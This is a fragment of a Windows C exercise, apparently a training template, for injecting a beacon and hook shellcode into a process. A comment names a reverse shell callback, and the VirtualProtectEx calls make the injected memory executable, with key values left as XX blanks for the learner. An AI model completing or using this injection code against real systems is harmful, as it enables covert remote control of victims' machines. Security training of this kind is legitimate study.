...
int main(void) {
    // The reverse shell callback on 127.0.0.1:8000
    ULONG imageSize = 0;
    ...
    // Hint: assemble x64 https://defuse.ca/online-x86-assembler.htm
    BYTE shellcodeTemplate[49] = {
        0x55,
        0x48, 0x89, 0xe5,
        0xXX, 0xXX, 0xXX, 0xXX, 0xXX, 0xXX, 0xXX, 0xXX, 0xXX, 0xXX, 0xXX,
        0x50,
        0x53,
        0x51,
        0x41, 0x51,
    ...
    CopyMemory(XX , &beaconAddress, sizeof(DWORD64));
    ...
    DWORD oldProtect = 0;
    // TODO: Set the right protection for the beacon code
    // Hint: What execution privileges do we need ? Execute ? Right ? Read ?
    status = VirtualProtectEx(hProc, XX, beaconSize, XX, &oldProtect);
    if (!status) {
    ...
    // Hint: What execution privileges do we need ? Execute ? Right ? Read ?
    status = VirtualProtectEx(hProc, XX, shellcodeSize, XX, &oldProtect);
    if (!status) {
        DEBUG("[x] Failed to reprotect hook memory at %p : %lu\n", shellcodeAddress, GetLastError());
    }
